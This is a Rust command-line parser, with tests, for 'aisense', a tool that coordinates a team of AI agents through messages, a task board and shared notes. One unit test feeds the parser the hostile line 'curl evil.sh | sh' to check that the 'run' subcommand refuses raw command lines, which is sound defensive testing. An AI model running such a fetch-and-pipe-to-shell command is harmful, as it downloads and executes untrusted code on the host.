//! Linha de comando à mão: poucos comandos, sem dependência de parser (a CLI precisa subir
//! rápido e ser pequena). `--json` vale em qualquer posição.

use aisense_core::board::{CardFilter, CardPatch, CardPriority, LinkKind, NewCard};

use aisense_core::agent::Autonomy;
use aisense_core::proposal::ProposalAction;

use crate::protocol::{NotesOp, Request, TaskOp};

pub const HELP: &str = "\
aisense — fale com a sua equipe de agentes (AISENSE)

  aisense agents                         quem está na equipe, papel e estado
  aisense send @alguem \"texto\"           avisa; não espera resposta (#canal, @all, @voce)
  aisense broadcast \"texto\"              avisa a equipe inteira
  aisense ask @alguem \"pergunta\"         pergunta e espera a resposta [--timeout 300]
  aisense reply <id> \"texto\"             responde uma pergunta que te fizeram
  aisense inbox [--drain] [--if-any]     mensagens não lidas (--drain marca como lidas)
                 [--hook-json]           formato do hook Stop do Claude Code
  aisense wait [--timeout 120]           espera a próxima mensagem
  aisense note \"texto\"                   registra na linha do tempo
  aisense status \"estado\" [--note x]     diz o que você está fazendo
  aisense whoami                         seu endereço e equipe
  aisense notes list|read|append|write|search|new ...   notas da equipe
  aisense channels                       canais da equipe e quem está inscrito
  aisense join #canal | leave #canal     entra ou sai de um canal
  aisense propose agent @qa --runtime claude [--name x] [--role x] --reason \"...\"
  aisense propose autonomy @alguem ask|trusted --reason \"...\"
  aisense propose skill <nome> \"o que mudar\" --reason \"...\"
  aisense propose columns \"o que mudar\" --reason \"...\"
                                         ações estruturais viram proposta para o humano
  aisense board [--column doing] [--full]  o quadro da equipe em texto
  aisense task next                      o próximo cartão que você deveria pegar
  aisense task list [--mine] [--column c] [--unassigned] [--label l] [--all]
  aisense task show <id>                 cartão completo: checklist, comentários, histórico
  aisense task add \"título\" [--body x] [--assign @a] [--column c] [--label l]
                 [--priority alta] [--blocked-by <id>] [--checklist \"a,b\"] [--parent <id>]
  aisense task claim <id>                pega para você (atômico)
  aisense task move <id> <coluna> [--reason x]
  aisense task update <id> [--title x] [--body x] [--assign @a|--unassign] [--add-label l]
                 [--remove-label l] [--priority p] [--blocked-by <id>] [--unblock <id>]
  aisense task check <id> <n> [--undo]   marca o item n do checklist
  aisense task comment <id> \"texto\"
  aisense task link <id> --pr 42|--commit sha|--file caminho|--url https://...
  aisense task block <id> --reason \"o que falta e quem destrava\"
  aisense task done <id> [--note \"...\"]
  aisense task split <id> \"parte 1\" \"parte 2\"
  aisense task watch [--timeout 600]     espera algo mudar nos seus cartões
  aisense task approve <id> [--note x] | reject <id> --reason x | archive <id>
  aisense commands                       comandos do projeto (aisense.toml)
  aisense run <nome>                     roda um comando do aisense.toml (só nomes)
  aisense bench [status|sync|diff|publish|list]   sua bancada (merge, nunca rebase)

  --json em qualquer comando devolve JSON.
  Saída: 0 ok · 1 erro de uso · 2 timeout · 3 destinatário ou AISENSE indisponível.
";

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    Help,
    Version,
    Whoami,
    Agents,
    Send {
        to: Vec<String>,
        body: String,
    },
    Broadcast {
        body: String,
    },
    Ask {
        to: String,
        body: String,
        timeout_s: Option<u32>,
    },
    Reply {
        reply_to: String,
        body: String,
    },
    Inbox {
        drain: bool,
        if_any: bool,
        /// Saída no formato do hook `Stop` do Claude Code (F05-08).
        hook_json: bool,
    },
    Wait {
        timeout_s: Option<u32>,
    },
    Note {
        body: String,
    },
    Status {
        state: String,
        note: Option<String>,
    },
    Notes(NotesOp),
    Board {
        column: Option<String>,
        full: bool,
    },
    Task(TaskOp),
    Channels,
    Subscribe {
        channel: String,
        join: bool,
    },
    Propose {
        action: ProposalAction,
        reason: String,
    },
    /// Executado pela própria CLI, no terminal do agente (F05-13).
    Run {
        name: String,
    },
    Commands,
    Bench(BenchAction),
}

/// `aisense bench [status|sync|diff|publish|list]`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BenchAction {
    Status,
    Sync,
    Diff,
    Publish,
    List,
}

impl Command {
    /// O frame que este comando manda. `Help`/`Version` são locais: `None`.
    pub fn request(&self) -> Option<Request> {
        Some(match self.clone() {
            Command::Whoami => Request::Whoami,
            Command::Agents => Request::Agents,
            Command::Send { to, body } => Request::Send {
                to,
                body,
                subject: None,
                meta: Default::default(),
            },
            Command::Broadcast { body } => Request::Send {
                to: vec!["@all".into()],
                body,
                subject: None,
                meta: Default::default(),
            },
            Command::Inbox { drain, .. } => Request::Inbox { drain },
            Command::Wait { timeout_s } => Request::Wait { timeout_s },
            Command::Note { body } => Request::Note { body },
            Command::Status { state, note } => Request::Status { state, note },
            Command::Ask {
                to,
                body,
                timeout_s,
            } => Request::Ask {
                to,
                body,
                timeout_s,
            },
            Command::Reply { reply_to, body } => Request::Reply { reply_to, body },
            Command::Notes(op) => Request::Notes(op),
            Command::Board { column, full } => Request::Board { column, full },
            Command::Task(op) => Request::Task(op),
            Command::Channels => Request::Channels,
            Command::Subscribe { channel, join } => Request::Subscribe { channel, join },
            Command::Propose { action, reason } => Request::Propose { action, reason },
            Command::Help
            | Command::Version
            | Command::Run { .. }
            | Command::Commands
            | Command::Bench(_) => return None,
        })
    }
}

#[derive(Debug, PartialEq, Eq)]
pub struct Parsed {
    pub command: Command,
    pub json: bool,
}

pub fn parse(argv: &[String]) -> Result<Parsed, String> {
    let json = argv.iter().any(|a| a == "--json");
    let mut args: Vec<String> = argv.iter().filter(|a| *a != "--json").cloned().collect();
    if args.is_empty() {
        return Ok(Parsed {
            command: Command::Help,
            json,
        });
    }
    let name = args.remove(0);
    let command = match name.as_str() {
        "-h" | "--help" | "help" => Command::Help,
        "-V" | "--version" => Command::Version,
        "whoami" => no_args(&args, Command::Whoami)?,
        "agents" => no_args(&args, Command::Agents)?,
        "send" => {
            let (to, rest): (Vec<_>, Vec<_>) = args
                .into_iter()
                .partition(|a| a.starts_with('@') || a.starts_with('#'));
            if to.is_empty() {
                return Err("diga para quem: aisense send @alguem \"texto\"".into());
            }
            Command::Send {
                to,
                body: body(rest)?,
            }
        }
        "broadcast" => Command::Broadcast { body: body(args)? },
        "ask" => {
            let timeout_s = take_number(&mut args, "--timeout")?;
            if args.is_empty() || !args[0].starts_with('@') {
                return Err("diga para quem: aisense ask @alguem \"pergunta\"".into());
            }
            let to = args.remove(0);
            Command::Ask {
                to,
                body: body(args)?,
                timeout_s,
            }
        }
        "reply" => {
            if args.is_empty() {
                return Err("diga qual pergunta: aisense reply <id> \"texto\"".into());
            }
            let reply_to = args.remove(0);
            Command::Reply {
                reply_to,
                body: body(args)?,
            }
        }
        "inbox" => {
            let drain = take_flag(&mut args, "--drain");
            let if_any = take_flag(&mut args, "--if-any");
            let hook_json = take_flag(&mut args, "--hook-json");
            no_args(
                &args,
                Command::Inbox {
                    drain,
                    if_any,
                    hook_json,
                },
            )?
        }
        "wait" => {
            let timeout_s = take_number(&mut args, "--timeout")?;
            no_args(&args, Command::Wait { timeout_s })?
        }
        "note" => Command::Note { body: body(args)? },
        "status" => {
            let note = take_value(&mut args, "--note")?;
            Command::Status {
                state: body(args)?,
                note,
            }
        }
        "notes" => Command::Notes(notes(args)?),
        "board" => {
            let column = take_value(&mut args, "--column")?;
            let full = take_flag(&mut args, "--full");
            no_args(&args, Command::Board { column, full })?
        }
        "task" => Command::Task(task(args)?),
        "channels" => no_args(&args, Command::Channels)?,
        "propose" => propose(args)?,
        "join" | "leave" => {
            if args.len() != 1 || !args[0].starts_with('#') {
                return Err(format!("diga o canal: aisense {name} #canal"));
            }
            Command::Subscribe {
                channel: args.remove(0),
                join: name == "join",
            }
        }
        "run" => {
            if args.len() != 1 {
                return Err(
                    "diga o nome de um comando do aisense.toml: aisense run test (veja: aisense commands)"
                        .into(),
                );
            }
            Command::Run {
                name: args.remove(0),
            }
        }
        "commands" => no_args(&args, Command::Commands)?,
        "bench" => {
            let action = match args.first().map(String::as_str) {
                None | Some("status") => BenchAction::Status,
                Some("sync") => BenchAction::Sync,
                Some("diff") => BenchAction::Diff,
                Some("publish") => BenchAction::Publish,
                Some("list") => BenchAction::List,
                Some(other) => return Err(format!("ação desconhecida em bench: {other}")),
            };
            if args.len() > 1 {
                return Err(format!("argumento inesperado: {}", args[1]));
            }
            Command::Bench(action)
        }
        other => return Err(format!("comando desconhecido: {other}")),
    };
    Ok(Parsed { command, json })
}

fn no_args(args: &[String], command: Command) -> Result<Command, String> {
    match args.first() {
        None => Ok(command),
        Some(extra) => Err(format!("argumento inesperado: {extra}")),
    }
}

/// O texto: o resto dos argumentos juntos (quem esquece as aspas também é atendido).
fn body(args: Vec<String>) -> Result<String, String> {
    let text = args.join(" ");
    if text.trim().is_empty() {
        return Err("faltou o texto (entre aspas)".into());
    }
    Ok(text)
}

fn take_flag(args: &mut Vec<String>, flag: &str) -> bool {
    let before = args.len();
    args.retain(|a| a != flag);
    args.len() != before
}

fn take_value(args: &mut Vec<String>, flag: &str) -> Result<Option<String>, String> {
    let Some(at) = args.iter().position(|a| a == flag) else {
        return Ok(None);
    };
    if at + 1 >= args.len() {
        return Err(format!("{flag} precisa de um valor"));
    }
    let value = args.remove(at + 1);
    args.remove(at);
    Ok(Some(value))
}

fn take_number(args: &mut Vec<String>, flag: &str) -> Result<Option<u32>, String> {
    take_value(args, flag)?
        .map(|v| {
            v.parse::<u32>()
                .map_err(|_| format!("{flag} espera segundos, recebeu {v:?}"))
        })
        .transpose()
}

/// Todas as ocorrências de uma opção repetível (`--label a --label b`).
fn take_values(args: &mut Vec<String>, flag: &str) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    while let Some(value) = take_value(args, flag)? {
        out.push(value);
    }
    Ok(out)
}

fn priority(raw: Option<String>) -> Result<Option<CardPriority>, String> {
    raw.map(|p| {
        CardPriority::parse(&p)
            .ok_or_else(|| format!("prioridade {p:?}: use baixa, media, alta ou urgente"))
    })
    .transpose()
}

fn task(mut args: Vec<String>) -> Result<TaskOp, String> {
    if args.is_empty() {
        return Err(
            "aisense task next|list|show|add|claim|move|update|check|comment|link|block|done|split|watch|approve|reject|archive"
                .into(),
        );
    }
    let action = args.remove(0);
    let id = |args: &mut Vec<String>| -> Result<String, String> {
        if args.is_empty() || args[0].starts_with("--") {
            Err(format!("diga qual cartão: aisense task {action} <id>"))
        } else {
            Ok(args.remove(0))
        }
    };
    Ok(match action.as_str() {
        "next" => {
            no_args(&args, Command::Help)?;
            TaskOp::Next
        }
        "list" => {
            let filter = CardFilter {
                column: take_value(&mut args, "--column")?,
                assignee: take_value(&mut args, "--assignee")?,
                mine: take_flag(&mut args, "--mine"),
                unassigned: take_flag(&mut args, "--unassigned"),
                label: take_value(&mut args, "--label")?,
                include_done: take_flag(&mut args, "--all"),
            };
            no_args(&args, Command::Help)?;
            TaskOp::List { filter }
        }
        "show" | "claim" | "archive" => {
            let id = id(&mut args)?;
            no_args(&args, Command::Help)?;
            match action.as_str() {
                "show" => TaskOp::Show { id },
                "claim" => TaskOp::Claim { id },
                _ => TaskOp::Archive { id },
            }
        }
        "add" => {
            let card = NewCard {
                body: take_value(&mut args, "--body")?.unwrap_or_default(),
                assignee: take_value(&mut args, "--assign")?,
                column: take_value(&mut args, "--column")?,
                labels: take_values(&mut args, "--label")?,
                priority: priority(take_value(&mut args, "--priority")?)?,
                blocked_by: take_values(&mut args, "--blocked-by")?,
                checklist: take_values(&mut args, "--checklist")?,
                parent: take_value(&mut args, "--parent")?,
                reason: take_value(&mut args, "--reason")?,
                title: String::new(),
            };
            TaskOp::Add {
                card: NewCard {
                    title: body(args)?,
                    ..card
                },
            }
        }
        "move" => {
            let reason = take_value(&mut args, "--reason")?;
            let id = id(&mut args)?;
            if args.len() != 1 {
                return Err("diga a coluna: aisense task move <id> doing".into());
            }
            TaskOp::Move {
                id,
                column: args.remove(0),
                reason,
            }
        }
        "update" => {
            let unassign = take_flag(&mut args, "--unassign");
            let patch = CardPatch {
                title: take_value(&mut args, "--title")?,
                body: take_value(&mut args, "--body")?,
                assignee: if unassign {
                    Some(String::new())
                } else {
                    take_value(&mut args, "--assign")?
                },
                add_labels: take_values(&mut args, "--add-label")?,
                remove_labels: take_values(&mut args, "--remove-label")?,
                priority: priority(take_value(&mut args, "--priority")?)?,
                add_checklist: take_values(&mut args, "--checklist")?,
                blocked_by: take_values(&mut args, "--blocked-by")?,
                unblock: take_values(&mut args, "--unblock")?,
            };
            let id = id(&mut args)?;
            no_args(&args, Command::Help)?;
            if patch == CardPatch::default() {
                return Err("nada para mudar: veja as opções em aisense --help".into());
            }
            TaskOp::Update { id, patch }
        }
        "check" => {
            let undo = take_flag(&mut args, "--undo");
            let id = id(&mut args)?;
            let item = args
                .first()
                .and_then(|n| n.parse::<u32>().ok())
                .ok_or("diga o número do item: aisense task check <id> 1")?;
            args.remove(0);
            no_args(&args, Command::Help)?;
            TaskOp::Check { id, item, undo }
        }
        "comment" => {
            let id = id(&mut args)?;
            TaskOp::Comment {
                id,
                body: body(args)?,
            }
        }
        "link" => {
            let mut found = Vec::new();
            for (flag, kind) in [
                ("--pr", LinkKind::Pr),
                ("--commit", LinkKind::Commit),
                ("--file", LinkKind::File),
                ("--url", LinkKind::Url),
            ] {
                if let Some(target) = take_value(&mut args, flag)? {
                    found.push((kind, target));
                }
            }
            let id = id(&mut args)?;
            no_args(&args, Command::Help)?;
            match found.len() {
                1 => {
                    let (kind, target) = found.remove(0);
                    TaskOp::Link { id, kind, target }
                }
                _ => {
                    return Err(
                        "use um de: --pr 42, --commit a1b2c3d, --file caminho, --url https://..."
                            .into(),
                    )
                }
            }
        }
        "block" | "reject" => {
            let reason = take_value(&mut args, "--reason")?.unwrap_or_default();
            let id = id(&mut args)?;
            no_args(&args, Command::Help)?;
            if action == "block" {
                TaskOp::Block { id, reason }
            } else {
                TaskOp::Reject { id, reason }
            }
        }
        "done" | "approve" => {
            let note = take_value(&mut args, "--note")?;
            let id = id(&mut args)?;
            no_args(&args, Command::Help)?;
            if action == "done" {
                TaskOp::Done { id, note }
            } else {
                TaskOp::Approve { id, note }
            }
        }
        "split" => {
            let id = id(&mut args)?;
            if args.is_empty() {
                return Err(
                    "diga as partes: aisense task split <id> \"parte 1\" \"parte 2\"".into(),
                );
            }
            TaskOp::Split { id, titles: args }
        }
        "watch" => {
            // `--mine` é o único modo: aceito para bater com o doc.
            take_flag(&mut args, "--mine");
            let timeout_s = take_number(&mut args, "--timeout")?;
            no_args(&args, Command::Help)?;
            TaskOp::Watch { timeout_s }
        }
        other => return Err(format!("ação desconhecida em task: {other}")),
    })
}

fn propose(mut args: Vec<String>) -> Result<Command, String> {
    let reason = take_value(&mut args, "--reason")?.unwrap_or_default();
    if args.is_empty() {
        return Err("aisense propose agent|autonomy|skill|columns ... --reason \"...\"".into());
    }
    let kind = args.remove(0);
    let action = match kind.as_str() {
        "agent" => {
            let adapter_id = take_value(&mut args, "--runtime")?.unwrap_or_default();
            let name = take_value(&mut args, "--name")?;
            let role = take_value(&mut args, "--role")?.unwrap_or_default();
            if args.len() != 1 || !args[0].starts_with('@') {
                return Err("diga o handle: aisense propose agent @qa --runtime claude".into());
            }
            let handle = args.remove(0);
            ProposalAction::CreateAgent {
                name: name.unwrap_or_else(|| handle.trim_start_matches('@').to_owned()),
                handle,
                role,
                adapter_id,
            }
        }
        "autonomy" => {
            if args.len() != 2 {
                return Err("aisense propose autonomy @alguem ask|trusted --reason \"...\"".into());
            }
            let autonomy = Autonomy::parse(&args[1])
                .ok_or_else(|| format!("autonomia {:?}: use ask ou trusted", args[1]))?;
            ProposalAction::SetAutonomy {
                handle: args.remove(0),
                autonomy,
            }
        }
        "skill" => {
            if args.len() < 2 {
                return Err("aisense propose skill <nome> \"o que mudar\" --reason \"...\"".into());
            }
            let skill = args.remove(0);
            ProposalAction::EditSkill {
                skill,
                change: body(args)?,
            }
        }
        "columns" => ProposalAction::ChangeColumns {
            change: body(args)?,
        },
        other => {
            return Err(format!(
                "o que propor? agent, autonomy, skill ou columns (recebi {other})"
            ))
        }
    };
    Ok(Command::Propose { action, reason })
}

fn notes(mut args: Vec<String>) -> Result<NotesOp, String> {
    if args.is_empty() {
        return Err("aisense notes list|read|append|write|search|new".into());
    }
    let action = args.remove(0);
    let slug = |args: &mut Vec<String>| -> Result<String, String> {
        if args.is_empty() {
            Err("faltou o nome da nota".into())
        } else {
            Ok(args.remove(0))
        }
    };
    Ok(match action.as_str() {
        "list" => {
            no_args(&args, Command::Help)?;
            NotesOp::List
        }
        "read" => {
            let section = take_value(&mut args, "--section")?;
            let slug = slug(&mut args)?;
            no_args(&args, Command::Help)?;
            NotesOp::Read { slug, section }
        }
        "append" => {
            let slug = slug(&mut args)?;
            NotesOp::Append {
                slug,
                text: body(args)?,
            }
        }
        "write" => {
            let file = take_value(&mut args, "--file")?;
            let expect_hash = take_value(&mut args, "--expect-hash")?;
            let slug = slug(&mut args)?;
            let content = match file {
                Some(path) => std::fs::read_to_string(&path)
                    .map_err(|e| format!("não consegui ler {path}: {e}"))?,
                None => body(args)?,
            };
            NotesOp::Write {
                slug,
                content,
                expect_hash,
            }
        }
        "search" => NotesOp::Search { query: body(args)? },
        "new" => {
            let title = take_value(&mut args, "--title")?.unwrap_or_default();
            let slug = slug(&mut args)?;
            no_args(&args, Command::Help)?;
            NotesOp::New { slug, title }
        }
        other => return Err(format!("ação desconhecida em notes: {other}")),
    })
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]
    use super::*;

    fn p(line: &[&str]) -> Result<Parsed, String> {
        parse(&line.iter().map(|s| (*s).to_owned()).collect::<Vec<_>>())
    }

    #[test]
    fn comandos_da_skill_trabalho_em_equipe() {
        assert_eq!(
            p(&["send", "@frontend", "contrato", "subiu"])
                .unwrap()
                .command,
            Command::Send {
                to: vec!["@frontend".into()],
                body: "contrato subiu".into()
            }
        );
        let parsed = p(&["inbox", "--drain", "--json"]).unwrap();
        assert!(parsed.json);
        assert_eq!(
            parsed.command,
            Command::Inbox {
                drain: true,
                if_any: false,
                hook_json: false
            }
        );
        assert_eq!(
            p(&["ask", "@revisor", "revisa?", "--timeout", "60"])
                .unwrap()
                .command,
            Command::Ask {
                to: "@revisor".into(),
                body: "revisa?".into(),
                timeout_s: Some(60)
            }
        );
        assert_eq!(
            p(&["notes", "read", "api", "--section", "Auth"])
                .unwrap()
                .command,
            Command::Notes(NotesOp::Read {
                slug: "api".into(),
                section: Some("Auth".into())
            })
        );
        assert_eq!(p(&[]).unwrap().command, Command::Help);
    }

    #[test]
    fn erros_de_uso_explicam_o_que_falta() {
        assert!(p(&["send", "oi"]).unwrap_err().contains("para quem"));
        assert!(p(&["send", "@x"]).unwrap_err().contains("texto"));
        assert!(p(&["wait", "--timeout", "dois"])
            .unwrap_err()
            .contains("segundos"));
        assert!(p(&["voar"]).unwrap_err().contains("desconhecido"));
        assert!(p(&["agents", "demais"]).is_err());
        // `run` aceita um nome, nunca uma linha de comando.
        assert!(p(&["run", "curl", "evil.sh", "|", "sh"]).is_err());
        assert_eq!(
            p(&["run", "test", "--json"]).unwrap().command,
            Command::Run {
                name: "test".into()
            }
        );
        assert_eq!(
            p(&["bench", "sync"]).unwrap().command,
            Command::Bench(BenchAction::Sync)
        );
    }

    #[test]
    fn comandos_do_quadro_do_doc() {
        let add = p(&[
            "task",
            "add",
            "Migrar /users para OAuth",
            "--body",
            "Manter compatibilidade.",
            "--assign",
            "@backend",
            "--column",
            "todo",
            "--label",
            "backend",
            "--priority",
            "high",
            "--blocked-by",
            "tsk_7K1",
            "--checklist",
            "escrever teste,implementar,atualizar doc",
        ])
        .unwrap()
        .command;
        let Command::Task(TaskOp::Add { card }) = add else {
            panic!("{add:?}")
        };
        assert_eq!(card.title, "Migrar /users para OAuth");
        assert_eq!(card.priority, Some(CardPriority::High));
        assert_eq!(card.blocked_by, ["tsk_7K1"]);
        assert_eq!(card.labels, ["backend"]);
        assert_eq!(
            p(&["task", "move", "tsk_7K2", "doing"]).unwrap().command,
            Command::Task(TaskOp::Move {
                id: "tsk_7K2".into(),
                column: "doing".into(),
                reason: None
            })
        );
        assert_eq!(
            p(&["task", "link", "tsk_7K2", "--pr", "42"])
                .unwrap()
                .command,
            Command::Task(TaskOp::Link {
                id: "tsk_7K2".into(),
                kind: LinkKind::Pr,
                target: "42".into()
            })
        );
        assert_eq!(
            p(&["task", "split", "tsk_7K2", "parte 1", "parte 2"])
                .unwrap()
                .command,
            Command::Task(TaskOp::Split {
                id: "tsk_7K2".into(),
                titles: vec!["parte 1".into(), "parte 2".into()]
            })
        );
        assert_eq!(
            p(&["task", "watch", "--mine", "--timeout", "600"])
                .unwrap()
                .command,
            Command::Task(TaskOp::Watch {
                timeout_s: Some(600)
            })
        );
        assert_eq!(
            p(&["board", "--column", "doing"]).unwrap().command,
            Command::Board {
                column: Some("doing".into()),
                full: false
            }
        );
        // Motivo vazio chega ao core, que devolve `reason_required` com a mensagem do doc.
        assert_eq!(
            p(&["task", "block", "tsk_7K2"]).unwrap().command,
            Command::Task(TaskOp::Block {
                id: "tsk_7K2".into(),
                reason: String::new()
            })
        );
        assert!(p(&["task", "move", "tsk_1"])
            .unwrap_err()
            .contains("coluna"));
        assert!(p(&["task", "claim"]).unwrap_err().contains("qual cartão"));
        assert!(p(&["task", "update", "tsk_1"])
            .unwrap_err()
            .contains("nada para mudar"));
        assert!(p(&["task", "link", "tsk_1"]).is_err());
        assert!(p(&["task", "add", "x", "--priority", "altissima"]).is_err());
    }
}
